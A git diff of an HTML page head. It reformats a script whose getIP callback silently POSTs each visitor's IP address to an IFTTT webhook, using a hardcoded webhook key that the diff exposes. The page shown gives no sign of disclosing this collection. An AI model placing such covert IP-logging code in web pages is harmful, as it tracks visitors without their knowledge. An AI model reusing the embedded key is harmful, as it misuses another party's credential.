@@ -2,18 +2,17 @@
 <head>
   <script src="https://code.jquery.com/jquery-3.5.0.min.js">
   <script type="application/javascript">
+    console.log("test");
     function getIP(json) {
-    var xhr = new XMLHttpRequest();
-    var url = "https://maker.ifttt.com/trigger/kapot/with/key/cuJdHHqca-JKcj02I7AM2J";
-    xhr.open("POST", url, true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-        var json = JSON.parse(xhr.responseText);
-    }
-};
-var data = JSON.stringify({"value1": json.ip});
-xhr.send(data);
+      var xhr = new XMLHttpRequest();
+      var url = "https://maker.ifttt.com/trigger/kapot/with/key/cuJdHHqca-JKcj02I7AM2J";
+      xhr.open("POST", url, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) var json = JSON.parse(xhr.responseText);
+    };
+    var data = JSON.stringify({"value1": json.ip});
+    xhr.send(data);
     }
   </script>
 
